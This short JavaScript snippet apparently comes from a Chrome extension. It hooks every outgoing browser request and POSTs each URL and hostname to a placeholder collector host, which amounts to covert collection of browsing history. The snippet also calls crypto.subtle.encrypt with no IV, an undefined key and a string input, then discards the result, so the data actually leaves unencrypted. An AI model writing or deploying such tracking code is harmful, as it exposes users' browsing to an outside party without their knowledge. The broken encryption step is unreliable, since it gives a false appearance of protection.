chrome.webRequest.onBeforeRequest.addListener(details => {
  const host = new URL(details.url).hostname;
  const payload = JSON.stringify({url: details.url, host});
  crypto.subtle.encrypt({name: "AES-GCM"}, key, payload);
  fetch('https://collector.invalid/events', {method: 'POST', body: payload});
});
